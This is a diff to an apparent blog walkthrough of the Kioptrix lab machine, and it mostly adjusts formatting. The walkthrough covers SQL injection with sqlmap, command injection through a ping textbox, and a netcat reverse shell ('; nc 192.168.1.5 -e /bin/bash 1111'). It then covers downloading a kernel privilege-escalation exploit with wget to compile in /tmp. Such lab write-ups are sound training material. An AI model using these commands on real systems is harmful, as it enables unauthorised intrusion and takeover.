@@ -63,7 +63,7 @@ sqlmap -u "http://192.168.1.101/index.php" --data "uname=admin&psw=password&btnL
 sqlmap has completed and found multiple injection points. Let's just use the username POST injection, we can do this in burpsuite by replacing the original code with the injection code. 
 <br><br>
 Now we are at this page:
-<br>
+<br><br>
 ![web after login](/assets/webpage after login.PNG){: .center-image }
 <br><br>
 What we need to now do is see if this textbox will run extra commands for us. Let's ping the Kioptrix machine and add {% highlight ruby %}; ls -l{% endhighlight %} and see if it brings back a list of files and owner of those files.
@@ -72,19 +72,15 @@ Sure enough, it does! Let's use another handy tool bundled in Kali, netcat
 
 First we need to work out the location to put netcat on the Kioptrix machine. For this we use "; find / -name nc 2>/dev/null" into the webpage. This brings back "/usr/local/bin/nc". 
 
-In Terminal, we get netcat listening with {% highlight ruby %}nc -lvp 1111{% endhighlight %}<br><br>I used port 1111, you can use whatever port you wish. 
+In Terminal, we get netcat listening with <br>{% highlight ruby %}nc -lvp 1111{% endhighlight %}<br>I used port 1111, you can use whatever port you wish. 
 <br>
 Then back in the webapp textbox we need to input<br>{% highlight ruby %}; /usr/local/bin/nc 192.168.1.5 -e '/bin/bash' 1111{% endhighlight %}
 <br><br><br>
-Now we've got a netcat connection going! Let's get some more information about the kernel. A quick {% highlight ruby %}uname -a{% endhighlight %} and we now know it's Linux Kernel 2.6.9-55 - Let's google an exploit
-<br>
+Now we've got a netcat connection going! Let's get some more information about the kernel. A quick {% highlight ruby %}uname -a{% endhighlight %} shows us this:
+<br><br>
 ![uname](/assets/kernel.PNG){: .center-image }
 <br><br>
-http://www.exploit-db.com/exploits/9542/
-<br><br>
-This exploit seems like it's gonna work for us! It's been tested on a similar machine to this one. 
-
-Let's save that to "/var/www/html", start Apache on our Kali machine and download the exploit through the session we created with netcat.
+We now know it's Linux Kernel 2.6.9-55 - Let's google an exploit! <a href="http://www.exploit-db.com/exploits/9542/">This exploit</a> seems like it's gonna work for us! It's been tested on a similar machine to this one. <br>Let's save that to "/var/www/html", start Apache on our Kali machine and download the exploit through the session we created with netcat.
 
 Okay, to download it let's first cd to /tmp. Now we can wget from our apache server, compile and execute!
 
